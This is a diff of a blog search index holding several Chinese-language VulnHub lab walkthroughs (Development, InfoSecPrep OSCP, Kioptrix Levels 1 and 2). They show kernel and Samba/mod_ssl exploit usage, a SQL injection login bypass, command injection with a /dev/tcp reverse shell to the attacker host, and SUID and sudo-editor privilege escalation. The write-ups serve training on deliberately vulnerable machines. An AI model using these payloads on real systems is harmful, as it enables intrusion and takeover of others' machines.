+<p>搜索公开漏洞，发现可以使用<a href="https://github.com/bcoles/kernel-exploits">CVE-2018-18955</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bcoles&#x2F;kernel-exploits.git</span><br><span class="line">cd kernel-exploits&#x2F;CVE-2018-18955&#x2F; </span><br><span class="line">gcc subuid_shell.c -o exp</span><br><span class="line">.&#x2F;exp</span><br><span class="line">gcc subshell.c -o subshell</span><br><span class="line">.&#x2F;subshell</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Development/15.jpg" alt="15"></p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><code>/etc/passwd</code>发现，patrick也拥有bash shell，不过之前ssh连接不上</p>
+<p>尝试使用su切换用户，成功用patrick登录</p>
+<p><img src="/images/Development/17.jpg" alt="17"></p>
+<p>而且该账户可以使用root权限使用vim和nano这样的文本编辑器</p>
+<p>那就代表可以修改<code>/etc/passwd</code>这样存放敏感信息的文件进行提权</p>
+<p>也可以运行vim输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>直接获取root bash</p>
+<p><img src="/images/Development/18.jpg" alt="18"></p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -8793,6 +8793,39 @@
       </tags>
   </entry>
   <entry>
+    <title>靶场InfoSecPrep OSCP</title>
+    <url>/2020/08/07/%E9%9D%B6%E5%9C%BAInfoSecPrep%20OSCP/</url>
+    <content><![CDATA[<h1 id="InfoSec-Prep-OSCP"><a href="#InfoSec-Prep-OSCP" class="headerlink" title="InfoSec Prep: OSCP"></a>InfoSec Prep: OSCP</h1><p>一个非常简单的靶机，5分钟就做完了，貌似可兑换OSCP的30天代金卷</p>
+<p>Kali:192.168.1.3</p>
+<p>靶机:192.168.1.200</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现了22和80端口</p>
+<p><img src="/images/InfoSec-Prep-OSCP/1.jpg" alt="1"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>主站运行这wordpress，wpscan没发现可以利用的漏洞</p>
+<p>发现路网站存在<code>robots.txt</code>提示了<code>secret.txt</code></p>
+<p><img src="/images/InfoSec-Prep-OSCP/2.jpg" alt="2"></p>
+<p>base64解密，得到<code>OPENSSH PRIVATE KEY</code></p>
+<p>看来是可以用来进行ssh登录的，接下来把它转换成<code>RSA PRIVATE KEY</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install putty-tools</span><br><span class="line">puttygen pass -o tempkey.ppk</span><br><span class="line">puttygen tempkey.ppk -O private-openssh -o id_rsa</span><br><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>再根据主机名猜一下用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa oscp@192.168.1.220</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/InfoSec-Prep-OSCP/4.jpg" alt="4"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>白给的</p>
+<p>SUID配置问题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm &#x2F;4000 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>直接执行bash就行</p>
+<p><img src="/images/InfoSec-Prep-OSCP/5.jpg" alt="5"></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>靶场Hackme 1</title>
     <url>/2020/09/17/%E9%9D%B6%E5%9C%BAHackme-1/</url>
     <content><![CDATA[<h1 id="Hackme-1"><a href="#Hackme-1" class="headerlink" title="Hackme 1"></a>Hackme 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.243</p>
@@ -8862,39 +8895,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶场InfoSecPrep OSCP</title>
-    <url>/2020/08/07/%E9%9D%B6%E5%9C%BAInfoSecPrep%20OSCP/</url>
-    <content><![CDATA[<h1 id="InfoSec-Prep-OSCP"><a href="#InfoSec-Prep-OSCP" class="headerlink" title="InfoSec Prep: OSCP"></a>InfoSec Prep: OSCP</h1><p>一个非常简单的靶机，5分钟就做完了，貌似可兑换OSCP的30天代金卷</p>
-<p>Kali:192.168.1.3</p>
-<p>靶机:192.168.1.200</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现了22和80端口</p>
-<p><img src="/images/InfoSec-Prep-OSCP/1.jpg" alt="1"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>主站运行这wordpress，wpscan没发现可以利用的漏洞</p>
-<p>发现路网站存在<code>robots.txt</code>提示了<code>secret.txt</code></p>
-<p><img src="/images/InfoSec-Prep-OSCP/2.jpg" alt="2"></p>
-<p>base64解密，得到<code>OPENSSH PRIVATE KEY</code></p>
-<p>看来是可以用来进行ssh登录的，接下来把它转换成<code>RSA PRIVATE KEY</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install putty-tools</span><br><span class="line">puttygen pass -o tempkey.ppk</span><br><span class="line">puttygen tempkey.ppk -O private-openssh -o id_rsa</span><br><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
-
-<p>再根据主机名猜一下用户</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa oscp@192.168.1.220</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/InfoSec-Prep-OSCP/4.jpg" alt="4"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>白给的</p>
-<p>SUID配置问题</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm &#x2F;4000 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-
-<p>直接执行bash就行</p>
-<p><img src="/images/InfoSec-Prep-OSCP/5.jpg" alt="5"></p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶场Kioptrix 2014</title>
     <url>/2020/05/23/%E9%9D%B6%E5%9C%BAKioptrix-2014/</url>
     <content><![CDATA[<h1 id="Kioptrix-2014"><a href="#Kioptrix-2014" class="headerlink" title="Kioptrix 2014"></a>Kioptrix 2014</h1><p>Kali:192.168.1.3</p>
@@ -8937,6 +8937,107 @@
 <p>之后编译执行</p>
 <p><img src="/images/Kioptrix-2014/14.jpg" alt="14"></p>
 <p>成功获取root权限</p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场Kioptrix_Level_1</title>
+    <url>/2020/03/25/%E9%9D%B6%E5%9C%BAKioptrix-Level-1/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix_Level_1"></a>Kioptrix_Level_1</h1><p>Kali:192.168.1.3</p>
+<p>靶机:192.168.1.104</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>nmap扫描端口</p>
+<p><img src="/images/Kioptrix1/4.jpg" alt="4"></p>
+<p>习惯性顺着来，22端口没发现可以顺利利用的漏洞</p>
+<p>80端口利用dirbuster进行目录枚举，找到了一个可以利用的点:mod_ssl</p>
+<p><img src="/images/Kioptrix1/5.jpg" alt="5"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><h3 id="mod-ssl"><a href="#mod-ssl" class="headerlink" title="mod_ssl"></a>mod_ssl</h3><p><img src="/images/Kioptrix1/6.jpg" alt="6"></p>
+<p>有几个OpenFuck缓冲区溢出的漏洞可以使用，我这里使用了<code>47080.c</code></p>
+<p>编译的时候报错了，发现少装个库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>
+
+<p>编译使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o exp 47080.c -lcrypto</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>
+
+<p>这里需要指定目标的操作系统和apache版本，根据之前Nmap扫描的结果定位到Redhat Linux及apache 1.3.20</p>
+<img src="/images/Kioptrix1/7.jpg"/> 
+
+<p>执行exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;exploit 0x6b 192.168.1.104 -c 50</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Kioptrix1/8.jpg" alt="8"></p>
+<p>直接就是root，有兴趣可以读一下flag在<code>/var/mail/root</code></p>
+<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>这里用了msf，进行了一次smb version的扫描</p>
+<p><img src="/images/Kioptrix1/9.jpg" alt="9"></p>
+<p>得到版本2.2.1a</p>
+<p>寻找可用的Exploit</p>
+<p><img src="/images/Kioptrix1/10.png" alt="10"></p>
+<p>这个RCE漏洞看来是个不错的选择</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;multiple&#x2F;remote&#x2F;10.c exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# gcc -o samba exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# chmod 777 samba</span><br><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;samba </span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">Usage: .&#x2F;samba [-bBcCdfprsStv] [host]</span><br><span class="line"></span><br><span class="line">-b &lt;platform&gt;   bruteforce (0 &#x3D; Linux, 1 &#x3D; FreeBSD&#x2F;NetBSD, 2 &#x3D; OpenBSD 3.1 and prior, 3 &#x3D; OpenBSD 3.2)</span><br><span class="line">-B &lt;step&gt;       bruteforce steps (default &#x3D; 300)</span><br><span class="line">-c &lt;ip address&gt; connectback ip address</span><br><span class="line">-C &lt;max childs&gt; max childs for scan&#x2F;bruteforce mode (default &#x3D; 40)</span><br><span class="line">-d &lt;delay&gt;      bruteforce&#x2F;scanmode delay in micro seconds (default &#x3D; 100000)</span><br><span class="line">-f              force</span><br><span class="line">-p &lt;port&gt;       port to attack (default &#x3D; 139)</span><br><span class="line">-r &lt;ret&gt;        return address</span><br><span class="line">-s              scan mode (random)</span><br><span class="line">-S &lt;network&gt;    scan mode</span><br><span class="line">-t &lt;type&gt;       presets (0 for a list)</span><br><span class="line">-v              verbose mode</span><br></pre></td></tr></table></figure>
+
+<p>这次编译没报错，直接运行拿到root</p>
+<p><img src="/images/Kioptrix1/11.jpg" alt="11"></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场Kioptrix-Level-2</title>
+    <url>/2020/05/03/%E9%9D%B6%E5%9C%BAKioptrix-Level-2/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-2"><a href="#Kioptrix-Level-2" class="headerlink" title="Kioptrix_Level_2"></a>Kioptrix_Level_2</h1><p>Kali:192.168.1.3</p>
+<p>靶机:192.168.1.233</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/images/Kioptrix2/12.jpg" alt="12"></p>
+<p>22端口没有发现好用的exp<br>80端口开放了web，3306开启了mysql，这是我们感兴趣的</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接看看web运行的是什么</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.233</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Kioptrix2/13.jpg" alt="13"></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>发现一个登录页面，经测试发现存在sql注入<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>登录成功，页面发生跳转</p>
+<p><img src="/images/Kioptrix2/14.jpg" alt="14"></p>
+<p>发现网站提供了<code>ping</code>用户输入的功能，输入<code>127.0.0.1</code><br>网站会打开一个新的页面，回显形式如下</p>
+<p><img src="/images/Kioptrix2/15.jpg" alt="15"></p>
+<p>预感这里使用ping命令会存在命令注入，经过测试发现</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Kioptrix2/16.jpg" alt="16"></p>
+<p>发现执行命令的用户权限为<code>apache</code></p>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>存在命令注入，我就可以利用它，进行反向连接来获取<code>apache</code>这个用户的bashshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 | bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Kioptrix2/17.jpg" alt="17"></p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先获取操作系统的相关信息(uname)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ uname -mrs</span><br><span class="line">Linux 2.6.9-55.EL i686</span><br></pre></td></tr></table></figure>
+
+<p>搜索可以利用exp，<code>9545.c</code>看上去一个不错的本地提权</p>
+<p><img src="/images/Kioptrix2/18.jpg" alt="18"></p>
+<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>这里我想在目标机上使用<code>wget</code>传输编译好的exp，所以我开启web服务，并复制exp到web目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp 9545.c &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>直接<code>wget</code>会报错，因为用户<code>apache</code>并不拥有<code>W</code>权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:07:25--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;exp&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line">exp: Permission denied</span><br><span class="line"></span><br><span class="line">Cannot write to &#96;exp&#39; (Permission denied).</span><br><span class="line">bash-3.00$ ls -ld &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct  8  2009 &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们转移到<code>/tmp</code>目录来执行我们的操作，成功传输了exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ cd &#x2F;tmp</span><br><span class="line">bash-3.00$ ls -ld &#x2F;tmp</span><br><span class="line">drwxr-xrwx  4 root root 4096 May  2 21:26 &#x2F;tmp</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:16:57--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;9545.c&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line"></span><br><span class="line">    0K .........                                             100%   76.47 MB&#x2F;s</span><br><span class="line"></span><br><span class="line">22:16:57 (76.47 MB&#x2F;s) - &#96;9545.c&#39; saved [9783&#x2F;9783]</span><br></pre></td></tr></table></figure>
+
+<p>编译执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ gcc 9545.c -o exploit</span><br><span class="line">9545.c:376:28: warning: no newline at end of file</span><br><span class="line">bash-3.00$ ls</span><br><span class="line">9545.c</span><br><span class="line">exploit</span><br><span class="line">bash-3.00$ .&#x2F;exploit</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>至此成功提权为root权限</p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -9119,107 +9220,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶场Kioptrix-Level-2</title>
-    <url>/2020/05/03/%E9%9D%B6%E5%9C%BAKioptrix-Level-2/</url>
-    <content><![CDATA[<h1 id="Kioptrix-Level-2"><a href="#Kioptrix-Level-2" class="headerlink" title="Kioptrix_Level_2"></a>Kioptrix_Level_2</h1><p>Kali:192.168.1.3</p>
-<p>靶机:192.168.1.233</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/images/Kioptrix2/12.jpg" alt="12"></p>
-<p>22端口没有发现好用的exp<br>80端口开放了web，3306开启了mysql，这是我们感兴趣的</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接看看web运行的是什么</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.233</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Kioptrix2/13.jpg" alt="13"></p>
-<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>发现一个登录页面，经测试发现存在sql注入<br>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
-
-<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>登录成功，页面发生跳转</p>
-<p><img src="/images/Kioptrix2/14.jpg" alt="14"></p>
-<p>发现网站提供了<code>ping</code>用户输入的功能，输入<code>127.0.0.1</code><br>网站会打开一个新的页面，回显形式如下</p>
-<p><img src="/images/Kioptrix2/15.jpg" alt="15"></p>
-<p>预感这里使用ping命令会存在命令注入，经过测试发现</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Kioptrix2/16.jpg" alt="16"></p>
-<p>发现执行命令的用户权限为<code>apache</code></p>
-<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>存在命令注入，我就可以利用它，进行反向连接来获取<code>apache</code>这个用户的bashshell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 | bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Kioptrix2/17.jpg" alt="17"></p>
-<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先获取操作系统的相关信息(uname)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ uname -mrs</span><br><span class="line">Linux 2.6.9-55.EL i686</span><br></pre></td></tr></table></figure>
-
-<p>搜索可以利用exp，<code>9545.c</code>看上去一个不错的本地提权</p>
-<p><img src="/images/Kioptrix2/18.jpg" alt="18"></p>
-<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>这里我想在目标机上使用<code>wget</code>传输编译好的exp，所以我开启web服务，并复制exp到web目录下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp 9545.c &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>直接<code>wget</code>会报错，因为用户<code>apache</code>并不拥有<code>W</code>权限</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:07:25--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;exp&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line">exp: Permission denied</span><br><span class="line"></span><br><span class="line">Cannot write to &#96;exp&#39; (Permission denied).</span><br><span class="line">bash-3.00$ ls -ld &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct  8  2009 &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>所以我们转移到<code>/tmp</code>目录来执行我们的操作，成功传输了exp</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ cd &#x2F;tmp</span><br><span class="line">bash-3.00$ ls -ld &#x2F;tmp</span><br><span class="line">drwxr-xrwx  4 root root 4096 May  2 21:26 &#x2F;tmp</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:16:57--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;9545.c&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line"></span><br><span class="line">    0K .........                                             100%   76.47 MB&#x2F;s</span><br><span class="line"></span><br><span class="line">22:16:57 (76.47 MB&#x2F;s) - &#96;9545.c&#39; saved [9783&#x2F;9783]</span><br></pre></td></tr></table></figure>
-
-<p>编译执行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ gcc 9545.c -o exploit</span><br><span class="line">9545.c:376:28: warning: no newline at end of file</span><br><span class="line">bash-3.00$ ls</span><br><span class="line">9545.c</span><br><span class="line">exploit</span><br><span class="line">bash-3.00$ .&#x2F;exploit</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<p>至此成功提权为root权限</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场Kioptrix_Level_1</title>
-    <url>/2020/03/25/%E9%9D%B6%E5%9C%BAKioptrix-Level-1/</url>
-    <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix_Level_1"></a>Kioptrix_Level_1</h1><p>Kali:192.168.1.3</p>
-<p>靶机:192.168.1.104</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>nmap扫描端口</p>
-<p><img src="/images/Kioptrix1/4.jpg" alt="4"></p>
-<p>习惯性顺着来，22端口没发现可以顺利利用的漏洞</p>
-<p>80端口利用dirbuster进行目录枚举，找到了一个可以利用的点:mod_ssl</p>
-<p><img src="/images/Kioptrix1/5.jpg" alt="5"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><h3 id="mod-ssl"><a href="#mod-ssl" class="headerlink" title="mod_ssl"></a>mod_ssl</h3><p><img src="/images/Kioptrix1/6.jpg" alt="6"></p>
-<p>有几个OpenFuck缓冲区溢出的漏洞可以使用，我这里使用了<code>47080.c</code></p>
-<p>编译的时候报错了，发现少装个库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>
-
-<p>编译使用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o exp 47080.c -lcrypto</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>
-
-<p>这里需要指定目标的操作系统和apache版本，根据之前Nmap扫描的结果定位到Redhat Linux及apache 1.3.20</p>
-<img src="/images/Kioptrix1/7.jpg"/> 
-
-<p>执行exp</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;exploit 0x6b 192.168.1.104 -c 50</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Kioptrix1/8.jpg" alt="8"></p>
-<p>直接就是root，有兴趣可以读一下flag在<code>/var/mail/root</code></p>
-<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>这里用了msf，进行了一次smb version的扫描</p>
-<p><img src="/images/Kioptrix1/9.jpg" alt="9"></p>
-<p>得到版本2.2.1a</p>
-<p>寻找可用的Exploit</p>
-<p><img src="/images/Kioptrix1/10.png" alt="10"></p>
-<p>这个RCE漏洞看来是个不错的选择</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;multiple&#x2F;remote&#x2F;10.c exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# gcc -o samba exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# chmod 777 samba</span><br><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;samba </span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">Usage: .&#x2F;samba [-bBcCdfprsStv] [host]</span><br><span class="line"></span><br><span class="line">-b &lt;platform&gt;   bruteforce (0 &#x3D; Linux, 1 &#x3D; FreeBSD&#x2F;NetBSD, 2 &#x3D; OpenBSD 3.1 and prior, 3 &#x3D; OpenBSD 3.2)</span><br><span class="line">-B &lt;step&gt;       bruteforce steps (default &#x3D; 300)</span><br><span class="line">-c &lt;ip address&gt; connectback ip address</span><br><span class="line">-C &lt;max childs&gt; max childs for scan&#x2F;bruteforce mode (default &#x3D; 40)</span><br><span class="line">-d &lt;delay&gt;      bruteforce&#x2F;scanmode delay in micro seconds (default &#x3D; 100000)</span><br><span class="line">-f              force</span><br><span class="line">-p &lt;port&gt;       port to attack (default &#x3D; 139)</span><br><span class="line">-r &lt;ret&gt;        return address</span><br><span class="line">-s              scan mode (random)</span><br><span class="line">-S &lt;network&gt;    scan mode</span><br><span class="line">-t &lt;type&gt;       presets (0 for a list)</span><br><span class="line">-v              verbose mode</span><br></pre></td></tr></table></figure>
-
-<p>这次编译没报错，直接运行拿到root</p>
-<p><img src="/images/Kioptrix1/11.jpg" alt="11"></p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶场Kioptrix-Level-4</title>
     <url>/2020/05/20/%E9%9D%B6%E5%9C%BAKioptrix-Level-4/</url>
     <content><![CDATA[<h1 id="Kioptrix-Level-4"><a href="#Kioptrix-Level-4" class="headerlink" title="Kioptrix_Level_4"></a>Kioptrix_Level_4</h1><p>Kali:192.168.1.3</p>
@@ -9285,63 +9285,6 @@
 <p>之后尝试使用UDF提权<br>这里有些奇怪，靶场已经帮你创建好了可执行系统命令的UDF函数，你直接调用就好。。。</p>
 <p><img src="/images/Kioptrix-Level-4/14.jpg" alt="14"></p>
 <p>提权成功</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场LordOfTheRoot_1.0.1</title>
-    <url>/2020/09/17/%E9%9D%B6%E5%9C%BALordOfTheRoot-1-0-1/</url>
